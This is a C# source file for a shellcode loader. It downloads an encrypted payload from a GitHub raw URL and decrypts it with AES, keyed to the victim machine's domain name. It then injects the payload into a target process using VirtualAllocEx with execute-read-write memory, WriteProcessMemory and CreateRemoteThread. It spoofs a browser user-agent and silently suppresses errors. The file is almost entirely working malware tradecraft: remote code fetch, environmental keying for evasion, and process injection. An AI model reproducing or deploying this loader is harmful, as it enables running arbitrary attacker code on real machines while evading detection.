using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Net;
using System.IO;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [Flags]
        public enum ProcessAccessFlags : uint
        {

            All = 0x001F0FFF
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x00001000

        }

        [Flags]
        public enum MemoryProtection
        {

            ExecuteReadWrite = 0x0040

        }

        static void Main(string[] args)
        {
            WebClient client = new WebClient();
            client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

            Stream encodedReader = client.OpenRead("https://raw.githubusercontent.com/barfedguy1996/fuzzy-bassoon/main/calc.raw");
            StreamReader reader = new StreamReader(encodedReader);
            string encodedString = reader.ReadToEnd();

            //Console.WriteLine(encodedString);

            encodedReader.Close();
            reader.Close();
            try
            {

                string EncryptionKey = System.Environment.UserDomainName;
                string cipherText = encodedString.Replace(" ", "+");
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }

                byte[] base64Data = Convert.FromBase64String(cipherText);

                int Injection_to_PID = Convert.ToInt32(args[0]);

                IntPtr _xhandle = OpenProcess(ProcessAccessFlags.All, false, Injection_to_PID);

                IntPtr _vax = VirtualAllocEx(_xhandle, IntPtr.Zero, (uint)base64Data.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);

                UIntPtr _out = UIntPtr.Zero;

                if (!WriteProcessMemory(_xhandle, _vax, base64Data, (uint)base64Data.Length, out _out)) { }
                uint xTid = 0;
                IntPtr Xthread = CreateRemoteThread(_xhandle, IntPtr.Zero, 0, _vax, IntPtr.Zero, 0, out xTid);

                CloseHandle(Xthread);
                CloseHandle(_xhandle);
            }
            catch
            {
                Console.Write("Cannot execute program due to critical error.");
            }

        }
    }
}
